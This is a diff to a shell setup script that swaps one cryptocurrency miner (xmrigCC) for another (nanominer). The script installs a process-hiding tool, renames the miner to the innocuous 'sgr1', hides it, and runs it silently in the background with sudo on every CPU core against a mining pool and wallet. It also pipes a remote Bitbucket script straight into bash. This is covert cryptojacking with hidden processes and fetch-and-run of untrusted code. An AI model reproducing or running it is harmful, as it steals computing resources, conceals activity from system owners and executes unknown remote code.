@@ -10,10 +10,10 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.3.1 -y && npm i -g node-process-hider && ph add sgr1"
 mkdir .kap && cd .kap
-wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz >/dev/null 2>&1
-tar -xvf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz >/dev/null 2>&1
-rm -rvf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz >/dev/null 2>&1
-cd miner 
-mv xmrigDaemon sgr1
-sudo ./sgr1 -a rx/0 -o elena.yourmining.site:3355 -u 0x3228974a6cc7986F38bBfadA0B6d98eEc1cFDc24.Sugoi -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
+wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz >/dev/null 2>&1
+tar xf nanominer-linux-3.5.1.tar.gz >/dev/null 2>&1
+rm -rvf nanominer-linux-3.5.1.tar.gz >/dev/null 2>&1
+cd nanominer-linux-3.5.1 
+mv nanominer sgr1
+sudo ./sgr1 -algo RandomX -wallet 0x3228974a6cc7986F38bBfadA0B6d98eEc1cFDc24 -coin XMR -rigName $(echo Rig$(shuf -i 1000-9999 -n 1)) -pool1 elena.yourmining.site:3355 -useSSL false -cpuThreads $(nproc --all) > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/korong/file/raw/master/time | bash
